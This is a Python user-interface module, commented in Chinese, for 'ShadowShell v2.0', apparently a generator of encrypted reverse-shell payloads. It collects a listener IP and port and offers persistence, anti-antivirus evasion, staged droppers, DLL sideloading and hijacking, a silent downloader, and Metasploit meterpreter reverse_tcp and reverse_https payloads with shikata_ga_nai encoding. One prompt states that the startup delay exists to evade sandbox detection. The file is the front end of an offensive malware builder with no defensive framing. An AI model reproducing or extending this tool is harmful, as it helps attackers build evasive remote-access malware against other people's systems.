# -*- coding: utf-8 -*-
"""
用户界面模块
提供交互式界面和命令行参数处理
"""
import argparse
from .utils import validate_ip, validate_port, print_banner
from .cipher import get_available_encryption_levels, get_encryption_level_description


def print_configuration_summary(config):
    """打印配置摘要"""
    print("\n" + "="*60)
    print("📋 配置摘要 Configuration Summary")
    print("="*60)
    print(f"1. 监听IP地址: {config['ip']}")
    print(f"2. 监听端口: {config['port']}")
    print(f"3. 加密级别: {config.get('encryption_level', 'advanced')} - {get_encryption_level_description(config.get('encryption_level', 'advanced'))}")
    print(f"4. 连接重试次数: {config['retry']}")
    print(f"5. 重试间隔秒数: {config['delay']}")
    print(f"6. 静默延迟时间: {config['silent_delay']} 秒")
    print(f"7. 密钥长度: {config['key_length']}")
    print(f"8. 输出目录: {config['output_dir']}")
    print(f"9. 自定义文件名: {config['filename'] if config['filename'] else '自动生成'}")
    print(f"10. 持久化功能: {'启用' if config['persistence'] else '禁用'}")
    print(f"11. 反检测功能: {'启用' if config['anti_detection'] else '禁用'}")
    print(f"12. 分阶段执行: {'启用' if config['use_dropper'] else '禁用'}")
    print(f"13. 白加黑技术: {'启用' if config['use_white_black'] else '禁用'}")
    if config.get('use_white_black'):
        print(f"    白加黑模式: {config.get('white_black_mode', 'wrapper')}")
    print(f"14. 下载器模式: {'启用' if config['use_downloader'] else '禁用'}")
    if config.get('use_downloader'):
        print(f"    下载地址: {config.get('download_url', 'N/A')}")
        print(f"    静默下载: {'是' if config.get('downloader_silent', True) else '否'}")
    print(f"15. MSF集成: {'启用' if config['use_msf'] else '禁用'}")
    if config.get('use_msf'):
        print(f"    载荷类型: {config.get('msf_payload', 'N/A')}")
        print(f"    编码器: {config.get('msf_encoder', '无')}")
        print(f"    输出格式: {config.get('msf_format', 'python')}")
    print("="*60)


def confirm_and_modify_configuration(config):
    """确认并允许修改配置"""
    while True:
        print_configuration_summary(config)
        
        confirm = input("\n✅ 确认配置? (Y/n/数字修改) >>> ").strip().lower()
        
        if confirm == 'n':
            print("❌ 配置取消")
            return None
        elif confirm == '' or confirm == 'y':
            print("✅ 配置确认")
            return config
        elif confirm.isdigit():
            option = int(confirm)
            config = modify_configuration_option(config, option)
        else:
            print("❌ 无效输入，请输入 y/n 或数字选项")


def modify_configuration_option(config, option):
    """修改特定配置选项"""
    if option == 1:
        # 修改IP地址
        while True:
            new_ip = input(f"当前IP: {config['ip']}, 输入新IP >>> ").strip()
            if validate_ip(new_ip):
                config['ip'] = new_ip
                break
            print("❌ IP地址格式不正确")
    
    elif option == 2:
        # 修改端口
        while True:
            new_port = input(f"当前端口: {config['port']}, 输入新端口 >>> ").strip()
            if validate_port(new_port):
                config['port'] = int(new_port)
                break
            print("❌ 端口号不正确")
    
    elif option == 3:
        # 修改加密级别
        print("\n🔐 加密级别选择:")
        levels = get_available_encryption_levels()
        for i, level in enumerate(levels, 1):
            print(f"{i}. {level} - {get_encryption_level_description(level)}")
        
        while True:
            choice = input("请选择加密级别 (1-4) >>> ").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(levels):
                config['encryption_level'] = levels[int(choice) - 1]
                break
            print("❌ 请输入有效选项")
    
    elif option == 4:
        # 修改重试次数
        try:
            new_retry = int(input(f"当前重试次数: {config['retry']}, 输入新值 >>> ").strip())
            config['retry'] = new_retry
        except ValueError:
            print("❌ 请输入有效数字")
    
    elif option == 5:
        # 修改重试间隔
        try:
            new_delay = int(input(f"当前重试间隔: {config['delay']}秒, 输入新值 >>> ").strip())
            config['delay'] = new_delay
        except ValueError:
            print("❌ 请输入有效数字")
    
    elif option == 6:
        # 修改静默延迟
        try:
            new_silent_delay = int(input(f"当前静默延迟: {config['silent_delay']}秒, 输入新值 >>> ").strip())
            config['silent_delay'] = new_silent_delay
        except ValueError:
            print("❌ 请输入有效数字")
    
    elif option == 7:
        # 修改密钥长度
        try:
            new_key_length = int(input(f"当前密钥长度: {config['key_length']}, 输入新值 >>> ").strip())
            if new_key_length > 0:
                config['key_length'] = new_key_length
            else:
                print("❌ 密钥长度必须大于0")
        except ValueError:
            print("❌ 请输入有效数字")
    
    elif option == 8:
        # 修改输出目录
        new_output_dir = input(f"当前输出目录: {config['output_dir']}, 输入新目录 >>> ").strip()
        if new_output_dir:
            config['output_dir'] = new_output_dir
    
    elif option == 9:
        # 修改文件名
        new_filename = input(f"当前文件名: {config['filename'] or '自动生成'}, 输入新文件名 (留空为自动生成) >>> ").strip()
        config['filename'] = new_filename if new_filename else None
    
    elif option == 10:
        # 切换持久化功能
        config['persistence'] = not config['persistence']
        print(f"✅ 持久化功能已{'启用' if config['persistence'] else '禁用'}")
    
    elif option == 11:
        # 切换反检测功能
        config['anti_detection'] = not config['anti_detection']
        print(f"✅ 反检测功能已{'启用' if config['anti_detection'] else '禁用'}")
    
    elif option == 12:
        # 切换分阶段执行
        config['use_dropper'] = not config['use_dropper']
        print(f"✅ 分阶段执行已{'启用' if config['use_dropper'] else '禁用'}")
    
    elif option == 13:
        # 切换白加黑技术
        config['use_white_black'] = not config['use_white_black']
        if config['use_white_black']:
            print("\n🎭 白加黑模式选择:")
            print("1. 合法程序包装 (推荐)")
            print("2. DLL侧加载")
            print("3. DLL劫持")
            
            while True:
                choice = input("请选择模式 (1-3) >>> ").strip()
                if choice in ['1', '2', '3']:
                    config['white_black_mode'] = {
                        '1': 'wrapper',
                        '2': 'sideloading', 
                        '3': 'hijacking'
                    }[choice]
                    break
                print("❌ 请输入有效选项 (1-3)")
        print(f"✅ 白加黑技术已{'启用' if config['use_white_black'] else '禁用'}")
    
    elif option == 14:
        # 切换下载器模式
        config['use_downloader'] = not config['use_downloader']
        if config['use_downloader']:
            while True:
                download_url = input("下载地址 (主程序URL) >>> ").strip()
                if download_url and (download_url.startswith('http://') or download_url.startswith('https://')):
                    config['download_url'] = download_url
                    break
                print("❌ 请输入有效的HTTP/HTTPS URL")
            
            config['downloader_silent'] = input("下载器静默模式? (Y/n) >>> ").strip().lower() != 'n'
        print(f"✅ 下载器模式已{'启用' if config['use_downloader'] else '禁用'}")
    
    elif option == 15:
        # 切换MSF集成
        config['use_msf'] = not config['use_msf']
        if config['use_msf']:
            # 检查MSF可用性
            from .msf_integration import MSFIntegration
            msf = MSFIntegration()
            
            if not msf.is_available():
                print("⚠️ 警告: 未检测到MSF/msfvenom，将跳过MSF集成")
                config['use_msf'] = False
            else:
                print("\n🎯 MSF载荷配置:")
                print("推荐载荷类型:")
                recommended_payloads = [
                    "python/meterpreter/reverse_tcp",
                    "python/meterpreter/reverse_https", 
                    "windows/meterpreter/reverse_tcp",
                    "linux/x64/meterpreter/reverse_tcp"
                ]
                recommended_display = [
                    "1. python/meterpreter/reverse_tcp (推荐)",
                    "2. python/meterpreter/reverse_https", 
                    "3. windows/meterpreter/reverse_tcp",
                    "4. linux/x64/meterpreter/reverse_tcp"
                ]
                for rec in recommended_display:
                    print(f"   {rec}")
                
                msf_payload = input("MSF载荷类型 (默认: python/meterpreter/reverse_tcp) >>> ").strip()
                if not msf_payload:
                    msf_payload = "python/meterpreter/reverse_tcp"
                elif msf_payload.isdigit():
                    # 用户输入了数字，转换为对应的载荷类型
                    choice = int(msf_payload)
                    if 1 <= choice <= len(recommended_payloads):
                        msf_payload = recommended_payloads[choice - 1]
                        print(f"✅ 已选择: {msf_payload}")
                    else:
                        print(f"❌ 无效选择，使用默认载荷")
                        msf_payload = "python/meterpreter/reverse_tcp"
                config['msf_payload'] = msf_payload
                
                use_encoder = input("使用编码器? (Y/n) >>> ").strip().lower() != 'n'
                if use_encoder:
                    msf_encoder = input("编码器 (默认: x86/shikata_ga_nai) >>> ").strip()
                    config['msf_encoder'] = msf_encoder if msf_encoder else "x86/shikata_ga_nai"
                    
                    try:
                        iterations = int(input("编码迭代次数 (默认: 3) >>> ").strip() or "3")
                        config['msf_iterations'] = iterations
                    except ValueError:
                        config['msf_iterations'] = 3
                
                msf_format = input("MSF输出格式 (默认: python) >>> ").strip()
                config['msf_format'] = msf_format if msf_format else 'python'
        
        print(f"✅ MSF集成已{'启用' if config['use_msf'] else '禁用'}")
    
    else:
        print("❌ 无效的选项号")
    
    return config
def interactive_mode():
    """交互式模式"""
    print_banner()
    print("\n请输入以下信息:")
    
    # 获取IP地址
    while True:
        ip = input("监听IP地址 >>> ").strip()
        if validate_ip(ip):
            break
        print("❌ IP地址格式不正确，请重新输入")
    
    # 获取端口
    while True:
        port = input("监听端口 >>> ").strip()
        if validate_port(port):
            port = int(port)
            break
        print("❌ 端口号不正确，请输入 1-65535 之间的数字")
    
    # 加密级别选择
    print("\n🔐 加密级别选择:")
    levels = get_available_encryption_levels()
    for i, level in enumerate(levels, 1):
        print(f"{i}. {level} - {get_encryption_level_description(level)}")
    
    while True:
        choice = input("请选择加密级别 (1-4, 默认: 3-advanced) >>> ").strip()
        if choice == '' or choice == '3':
            encryption_level = 'advanced'
            break
        elif choice.isdigit() and 1 <= int(choice) <= len(levels):
            encryption_level = levels[int(choice) - 1]
            break
        print("❌ 请输入有效选项 (1-4)")
    
    # 高级选项
    print("\n🔧 高级选项:")
    retry_count = input("连接重试次数 (默认: 10) >>> ").strip() or "10"
    retry_delay = input("重试间隔秒数 (默认: 5) >>> ").strip() or "5"
    
    # 静默延迟时间 - 更明显的提示
    print("\n⏰ 静默延迟设置:")
    print("静默延迟是程序执行前的等待时间，可以帮助绕过一些沙箱检测")
    silent_delay = input("静默延迟时间(秒) (默认: 30) >>> ").strip() or "30"
    
    key_length = input("密钥长度 (默认: 16) >>> ").strip() or "16"
    
    try:
        retry_count = int(retry_count)
        retry_delay = int(retry_delay)
        silent_delay = int(silent_delay)
        key_length = int(key_length)
    except ValueError:
        print("⚠️ 使用默认值")
        retry_count, retry_delay, silent_delay, key_length = 10, 5, 30, 16
    
    # 输出选项
    output_dir = input("输出目录 (默认: output) >>> ").strip() or "output"
    custom_filename = input("自定义文件名 (可选) >>> ").strip() or None
    
    add_persistence = input("添加持久化功能? (y/N) >>> ").strip().lower() == 'y'
    anti_detection = input("添加反杀毒特征? (Y/n) >>> ").strip().lower() != 'n'
    use_dropper = input("使用分阶段执行模式? (Y/n) >>> ").strip().lower() != 'n'
    
    # 白加黑功能选项
    use_white_black = input("使用白加黑技术? (y/N) >>> ").strip().lower() == 'y'
    white_black_mode = None
    
    if use_white_black:
        print("\n🎭 白加黑模式选择:")
        print("1. 合法程序包装 (推荐)")
        print("2. DLL侧加载")
        print("3. DLL劫持")
        
        while True:
            choice = input("请选择模式 (1-3) >>> ").strip()
            if choice in ['1', '2', '3']:
                white_black_mode = {
                    '1': 'wrapper',
                    '2': 'sideloading', 
                    '3': 'hijacking'
                }[choice]
                break
            print("❌ 请输入有效选项 (1-3)")
    
    # 新增：下载器选项
    use_downloader = input("生成下载器模式? (y/N) >>> ").strip().lower() == 'y'
    download_url = None
    downloader_silent = False
    
    if use_downloader:
        while True:
            download_url = input("下载地址 (主程序URL) >>> ").strip()
            if download_url and (download_url.startswith('http://') or download_url.startswith('https://')):
                break
            print("❌ 请输入有效的HTTP/HTTPS URL")
        
        downloader_silent = input("下载器静默模式? (Y/n) >>> ").strip().lower() != 'n'
    
    # 新增：MSF集成选项
    use_msf = input("使用MSF(Metasploit)载荷? (y/N) >>> ").strip().lower() == 'y'
    msf_payload = None
    msf_encoder = None
    msf_iterations = 1
    msf_format = 'python'
    
    if use_msf:
        # 检查MSF可用性
        from .msf_integration import MSFIntegration
        msf = MSFIntegration()
        
        if not msf.is_available():
            print("⚠️ 警告: 未检测到MSF/msfvenom，将跳过MSF集成")
            use_msf = False
        else:
            print("\n🎯 MSF载荷配置:")
            print("推荐载荷类型:")
            recommended_payloads = [
                "python/meterpreter/reverse_tcp",
                "python/meterpreter/reverse_https", 
                "windows/meterpreter/reverse_tcp",
                "linux/x64/meterpreter/reverse_tcp"
            ]
            recommended_display = [
                "1. python/meterpreter/reverse_tcp (推荐)",
                "2. python/meterpreter/reverse_https", 
                "3. windows/meterpreter/reverse_tcp",
                "4. linux/x64/meterpreter/reverse_tcp"
            ]
            for rec in recommended_display:
                print(f"   {rec}")
            
            # 载荷选择
            msf_payload = input("MSF载荷类型 (默认: python/meterpreter/reverse_tcp) >>> ").strip()
            if not msf_payload:
                msf_payload = "python/meterpreter/reverse_tcp"
            elif msf_payload.isdigit():
                # 用户输入了数字，转换为对应的载荷类型
                choice = int(msf_payload)
                if 1 <= choice <= len(recommended_payloads):
                    msf_payload = recommended_payloads[choice - 1]
                    print(f"✅ 已选择: {msf_payload}")
                else:
                    print(f"❌ 无效选择，使用默认载荷")
                    msf_payload = "python/meterpreter/reverse_tcp"
            
            # 编码器选择 
            use_encoder = input("使用编码器? (Y/n) >>> ").strip().lower() != 'n'
            if use_encoder:
                print("推荐编码器: x86/shikata_ga_nai, base64, x64/zutto_dekiru")
                msf_encoder = input("编码器 (默认: x86/shikata_ga_nai) >>> ").strip()
                if not msf_encoder:
                    msf_encoder = "x86/shikata_ga_nai"
                
                iterations_input = input("编码迭代次数 (默认: 3) >>> ").strip()
                try:
                    msf_iterations = int(iterations_input) if iterations_input else 3
                except ValueError:
                    msf_iterations = 3
            
            # 输出格式
            print("输出格式: python (推荐), raw, exe, dll, powershell")
            msf_format = input("MSF输出格式 (默认: python) >>> ").strip() or 'python'
    
    # 构建配置字典
    config = {
        'ip': ip,
        'port': port,
        'encryption_level': encryption_level,
        'retry': retry_count,
        'delay': retry_delay,
        'silent_delay': silent_delay,
        'key_length': key_length,
        'output_dir': output_dir,
        'filename': custom_filename,
        'persistence': add_persistence,
        'anti_detection': anti_detection,
        'use_dropper': use_dropper,
        'use_white_black': use_white_black,
        'white_black_mode': white_black_mode,
        'use_downloader': use_downloader,
        'download_url': download_url,
        'downloader_silent': downloader_silent,
        'use_msf': use_msf,
        'msf_payload': msf_payload,
        'msf_encoder': msf_encoder,
        'msf_iterations': msf_iterations,
        'msf_format': msf_format
    }
    
    # 配置确认和修改
    return confirm_and_modify_configuration(config)


def command_line_mode():
    """命令行参数模式"""
    parser = argparse.ArgumentParser(description='ShadowShell v2.0 - 高级模块化Shell生成器')
    parser.add_argument('-i', '--ip', required=True, help='监听IP地址')
    parser.add_argument('-p', '--port', required=True, type=int, help='监听端口')
    parser.add_argument('-e', '--encryption-level', choices=['basic', 'standard', 'advanced', 'maximum'],
                       default='advanced', help='加密级别: basic(基础), standard(标准), advanced(高级), maximum(最高)')
    parser.add_argument('-r', '--retry', default=10, type=int, help='连接重试次数')
    parser.add_argument('-d', '--delay', default=5, type=int, help='重试间隔')
    parser.add_argument('-k', '--key-length', default=16, type=int, help='密钥长度')
    parser.add_argument('-o', '--output', default='output', help='输出目录')
    parser.add_argument('-f', '--filename', help='自定义文件名')
    parser.add_argument('--persistence', action='store_true', help='添加持久化功能')
    parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
    parser.add_argument('--use-dropper', action='store_true', help='使用分阶段执行模式')
    parser.add_argument('--use-white-black', action='store_true', help='使用白加黑技术')
    parser.add_argument('--white-black-mode', choices=['wrapper', 'sideloading', 'hijacking'], 
                       default='wrapper', help='白加黑模式: wrapper(包装), sideloading(侧加载), hijacking(劫持)')
    parser.add_argument('--use-downloader', action='store_true', help='生成下载器模式')
    parser.add_argument('--download-url', help='下载地址 (主程序URL)')
    parser.add_argument('--downloader-silent', action='store_true', help='下载器静默模式')
    parser.add_argument('--use-msf', action='store_true', help='使用MSF(Metasploit)载荷')
    parser.add_argument('--msf-payload', default='python/meterpreter/reverse_tcp', 
                       help='MSF载荷类型 (默认: python/meterpreter/reverse_tcp)')
    parser.add_argument('--msf-encoder', help='MSF编码器 (如: x86/shikata_ga_nai)')
    parser.add_argument('--msf-iterations', type=int, default=3, help='MSF编码迭代次数')
    parser.add_argument('--msf-format', default='python', choices=['python', 'raw', 'exe', 'dll', 'powershell'],
                       help='MSF输出格式')
    parser.add_argument('--quiet', action='store_true', help='静默模式')
    parser.add_argument('--silent-delay', default=30, type=int, help='静默延迟时间（秒），在执行危险操作前等待')
    
    return parser.parse_args()
